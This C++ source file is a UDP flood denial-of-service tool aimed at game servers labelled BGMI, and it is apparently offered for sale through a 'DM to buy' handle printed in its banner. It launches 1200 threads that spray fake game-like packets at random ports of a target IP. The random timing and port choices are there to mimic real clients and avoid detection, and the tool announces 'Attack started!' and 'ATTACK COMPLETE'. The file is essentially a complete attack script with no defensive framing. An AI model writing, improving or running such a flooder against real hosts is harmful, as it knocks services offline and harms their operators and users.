#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 677
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

template <typename T>
void countdown(T duration) {
    for (int i = duration; i > 0; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
}

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    std::srand(threadId + time(nullptr));

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        return;
    }

    // Random source port in BGMI-like range
    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = htons(10000 + (rand() % 50000)); // 10000-60000
    bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr));

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    long long threadPackets = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        // Random target port in BGMI range
        int targetPort = baseTargetPort + (rand() % 50000); // 0-50000 offset
        serverAddr.sin_port = htons(targetPort);

        // Fragmented packet with BGMI-like payload
        int remainingSize = packetSize;
        while (remainingSize > 0) {
            int chunkSize = std::min(remainingSize, MIN_PACKET_SIZE + (rand() % 1500)); // Mimic MTU-like sizes
            char* packet = new char[chunkSize];

            // Fake BGMI-ish header (guess: ID + sequence)
            std::string fakeHeader = "BGMI" + std::to_string(rand() % 9999) + "|" + std::to_string(threadId % 100) + ":";
            int headerLen = std::min((int)fakeHeader.length(), chunkSize);
            std::memcpy(packet, fakeHeader.c_str(), headerLen);
            for (int i = headerLen; i < chunkSize - 1; i++) {
                packet[i] = rand() % 256; // Random game-like data
            }
            packet[chunkSize - 1] = '\0';

            ssize_t bytesSent = sendto(udpSocket, packet, chunkSize, 0,
                                     (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            if (bytesSent > 0) {
                threadPackets++;
                threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
            } else if (bytesSent < 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY + (rand() % 500)));
                delete[] packet;
                break;
            }

            delete[] packet;
            remainingSize -= chunkSize;

            // Burst delay (mimic mobile client)
            std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 10 + 1)); // 1-10ms
        }

        // Traffic shaping: random burst pauses
        if (rand() % 100 < 15) { // 15% chance of a "lag" pause
            std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 300 + 100)); // 100-400ms
        } else {
            std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 30 + 1)); // 1-30ms
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    std::string hackMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'OKAY' OR 'NO' TO RESPOND.";
    sendto(udpSocket, hackMessage.c_str(), hackMessage.length(), 0, (struct sockaddr*)&clientAddr, clientLen);

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::string response(buffer, bytes);
            if (response == "OKAY" || response == "NO") {
                break;
            }
        }
        else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n\n";

    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < DEFAULT_NUM_THREADS; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, DEFAULT_NUM_THREADS);
    }

    std::cout << "\nAttack started!\n";
    countdown(durationSeconds);

    keepSending = false;
    for (auto& t : senderThreads) {
        t.join();
    }

    keepReceiving = false;
    receiverThread.join();

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    std::cout << "DM to buy at - @Rohan2349\n";
    return 0;
}